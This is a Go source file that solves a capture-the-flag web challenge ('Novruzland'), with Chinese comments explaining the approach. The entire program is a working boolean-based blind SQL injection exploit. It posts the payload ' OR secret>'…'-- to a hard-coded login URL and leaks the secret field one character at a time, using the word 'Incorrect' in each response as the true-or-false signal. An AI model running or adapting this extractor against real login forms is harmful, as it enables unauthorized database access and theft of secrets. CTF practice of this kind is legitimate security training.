// =============================================================================
// 题目名称: Novruzland
// 题目类别: Web - SQL 盲注 (Blind SQL Injection)
// 解题思路: 登录接口存在 SQL 注入，利用基于布尔的盲注逐字符比较 secret 字段，
//
//	通过 "Incorrect" 关键词判断注入条件是否成立，逐位泄露 flag
//
// 用法: go run NovruzCTF_Novruzland.go [目标地址]
//
//	示例: go run NovruzCTF_Novruzland.go http://95.111.234.103:33097/login
//
// =============================================================================
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const (
	defaultLoginURL = "http://95.111.234.103:33097/login"
	// flag 字符集
	charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-}"
	// flag 已知前缀
	flagPrefix = "novruzctf{"
	// 最大提取长度
	maxFlagLen = 80
)

func checkCandidate(client *http.Client, target, testStr string) (bool, error) {
	vals := url.Values{}
	vals.Set("username", "' OR secret>'"+testStr+"'-- ")
	vals.Set("password", "kerrev")
	body := vals.Encode()

	req, _ := http.NewRequest("POST", target, bytes.NewBufferString(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return strings.Contains(string(b), "Incorrect"), nil
}

func main() {
	target := defaultLoginURL
	if len(os.Args) > 1 {
		target = os.Args[1]
	}

	client := &http.Client{Timeout: 10 * time.Second}
	known := flagPrefix

	for pos := 1; pos <= maxFlagLen; pos++ {
		found := false
		for i := 0; i < len(charset); i++ {
			c := charset[i : i+1]
			testStr := known + c + "~"
			ok, err := checkCandidate(client, target, testStr)
			if err != nil {
				fmt.Fprintf(os.Stderr, "[!] 请求错误: %v\n", err)
				os.Exit(1)
			}
			if ok {
				known += c
				fmt.Printf("pos %d: %s\n", pos, known)
				found = true
				break
			}
		}
		if !found || strings.HasSuffix(known, "}") {
			break
		}
	}
	fmt.Println("flag:", known)
}
